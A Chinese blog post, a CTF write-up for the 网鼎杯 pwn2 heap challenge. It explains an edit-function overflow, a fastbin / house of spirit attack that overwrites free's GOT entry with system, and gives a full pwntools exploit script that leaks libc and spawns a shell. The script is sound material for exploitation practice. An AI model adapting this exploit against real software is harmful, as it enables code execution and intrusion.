---
title: 网鼎杯第三场Pwn2
date: 2018-08-28 08:37:40
tags: [CTF, PWN]
categories: 网鼎杯
---
## 网鼎杯 第三场 pwn2 wp
​	昨天群里群主说网鼎杯有道pwn2已经写能写got表了，但是最后还是没有做出来，很好奇就去看了一下。  
	<!--more-->
	经典选单程序不多说，先来找一波漏洞。add函数将size和chunk ptr交错置于bss段上，delete函数没有uaf，但是edit函数中存在溢出，那就好办了，已知的符合此种情况的攻击方式貌似很多，unlink和fastbin attack，unsorted bin attack，top chunk attack理论上应该都是可以的，因为可以任意溢出，这里的话我用的是fastbin attack。毕竟检查比较方便，也只要构造单向链表。  
	这里的思路是通过构造fake chunk之后利用house of spirit写free_got，当然atoi_got应该也是可以的，待会去试下，同时在堆上存一个/bin/sh，之后delete一下就能get shell了，说起来很简单，其实坑也很多,但是说白了其实也是自己对堆管理模式还是不够清楚，网鼎杯后打算好好补一波理论了。  
坑点1：  
	需要修改fake chunk的size段使其满足在0x70的fastbin中，因为之后我们写的chunk size为0x7f，这里需要满足下，否在程序会报错"malloc():memory corruption(fast)"，出现这个报错一般就是fastbin中的size不匹配问题了。比如说如果fastbin是0x20，那么chunk的size也必须是0x20。  
坑点2：  
	read之后的加'\x00'操作，如果直接p64()写got表的话容易溢出\x00到目标got的后一个got，可能会对程序流程有一定的影响，同样的，edit的长度也要注意下，否则容易把'\x0a'写入到目标got的后一个got中影响程序流程。  
大概就是这样了，这道题方法应该很多，有空可以试试其它方法，加深一下理解。

```
from pwn import *
p=process('./pwn')
elf=ELF('./pwn')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p,'''
#	break *0x0000000000400E58
#	continue
#''')
def add(size,x):
	p.recvuntil('Your choice:')
	p.sendline('2')
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the name of servant:')
	p.sendline(x)

def dele(idx):
	p.recvuntil('Your choice:')
	p.sendline('4')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(idx))

def edit(idx,size,x):
	p.recvuntil('Your choice:')
	p.sendline('3')
	p.recvuntil('Please enter the index of servant:')
	p.sendline(str(idx))
	p.recvuntil('Please enter the length of servant name:')
	p.sendline(str(size))
	p.recvuntil('Please enter the new name of the servnat:')
	p.sendline(x)

def show():
	p.recvuntil('Your choice:')
	p.sendline('1')

add(0x68,'a'*0x68)
add(0x68,'b'*0x68)
add(0x68,'c'*0x68)
add(0x60,'/bin/sh\x00')
dele(1)
#edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
edit(0,0x68+0x10+0x8,'1'*0x68+p64(0x71)+p64(0x00000000006020C0-0x13))
add(0x68,'a'*0x68)
add(0x68,'\x00'*3+p64(0x68)+p64(elf.got['free']))
show()
p.recvuntil('0 : ')
free_address=u64(p.recv(6).ljust(8,'\x00'))
#print hex(free_address)
log.info('free_address > '+hex(free_address))
libc_base=free_address-libc.symbols['free']
system_address=libc_base+libc.symbols['system']
log.info('system_address > '+hex(system_address))
#edit(2,0x8,'/bin/sh\x00')
edit(0,0x7,p64(system_address)[0:7])
dele(3)
p.interactive()

```

